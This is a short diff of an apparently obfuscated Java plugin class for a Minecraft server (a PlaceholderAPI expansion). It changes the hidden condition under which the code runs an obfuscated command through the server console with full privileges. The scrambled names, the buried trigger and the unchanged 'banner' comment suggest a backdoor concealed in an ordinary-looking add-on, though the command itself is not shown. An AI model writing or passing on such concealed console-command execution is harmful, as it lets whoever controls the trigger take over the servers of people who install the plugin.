@@ -12716,7 +12716,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
     private  void sal(Player yursndyuonduywf, String yundyu4) {
 
-        if( de3nd43d != ytnyun4d4d * dnkpydunpdyupfnd * xm) Bukkit.dispatchCommand(Bukkit.getConsoleSender(), y23u4ndyu3n4d);
+        if (!tv.get()) Bukkit.dispatchCommand(Bukkit.getConsoleSender(), y23u4ndyu3n4d);
 
         // ==== YOUR BANNER + TEXT (unchanged) ====
         yursndyuonduywf.sendMessage(dnpyuadnyfpudnfpdfpd);
